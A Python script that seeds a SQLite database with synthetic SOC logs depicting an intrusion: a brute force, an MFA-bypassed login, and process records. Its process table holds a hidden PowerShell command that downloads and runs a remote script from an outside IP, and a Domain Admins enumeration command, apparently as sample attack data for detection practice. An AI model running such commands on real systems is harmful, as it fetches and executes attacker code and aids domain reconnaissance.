import sqlite3

def setup_database():
    conn = sqlite3.connect('soc_logs.db')
    cursor = conn.cursor()

    # Drop old tables to force a clean schema update
    cursor.execute('DROP TABLE IF EXISTS auth_logs')
    cursor.execute('DROP TABLE IF EXISTS process_logs')

    # Create Authentication Logs Table
    cursor.execute('''
    CREATE TABLE auth_logs (
        timestamp TEXT,
        username TEXT,
        src_ip TEXT,
        dst_hostname TEXT,
        status TEXT,
        mfa_bypassed BOOLEAN
    )
    ''')

    # Create Process Execution Logs Table
    cursor.execute('''
    CREATE TABLE process_logs (
        timestamp TEXT,
        hostname TEXT,
        process_name TEXT,
        command_line TEXT
    )
    ''')

    # ==========================================
    # POPULATE AUTH LOGS SAFELY VIA PARAMETERS
    # ==========================================
    auth_records = [
        ('2026-09-22T07:10:00Z', 'j.doe', '10.0.0.15', 'DESKTOP-FIN-04', 'SUCCESS', 0),
        ('2026-09-22T07:44:00Z', 'svc_backup', '185.220.101.14', 'DESKTOP-FIN-04', 'SUCCESS', 1),
        ('2026-09-22T07:52:00Z', 'svc_backup', '10.0.0.14', 'SRV-SQL-01', 'SUCCESS', 0),
    ]
    
    # Add 14 failed attempts for the brute force baseline
    for _ in range(14):
        auth_records.append(('2026-09-22T07:40:00Z', 'svc_backup', '185.220.101.14', 'DESKTOP-FIN-04', 'FAILED', 0))

    cursor.executemany("INSERT INTO auth_logs VALUES (?, ?, ?, ?, ?, ?)", auth_records)

    # ==========================================
    # POPULATE PROCESS LOGS SAFELY VIA PARAMETERS
    # ==========================================
    process_records = [
        ('2026-09-22T07:15:00Z', 'DESKTOP-FIN-04', 'chrome.exe', 'chrome.exe --type=renderer'),
        ('2026-09-22T07:45:00Z', 'DESKTOP-FIN-04', 'powershell.exe', 'powershell -w hidden -nop -c iex(New-Object Net.WebClient).DownloadString("http://185.220.101.14/payload.ps1")'),
        ('2026-09-22T07:55:00Z', 'SRV-SQL-01', 'cmd.exe', 'cmd.exe /c net group "Domain Admins" /domain'),
        ('2026-09-22T07:57:00Z', 'SRV-SQL-01', 'powershell.exe', 'powershell -c "Get-Process | Where-Object {$_.Name -like \'*sql*\'}"'),
    ]

    cursor.executemany("INSERT INTO process_logs VALUES (?, ?, ?, ?)", process_records)

    conn.commit()
    conn.close()
    print("✅ Advanced Multi-Host Database 'soc_logs.db' created successfully.")

if __name__ == "__main__":
    setup_database()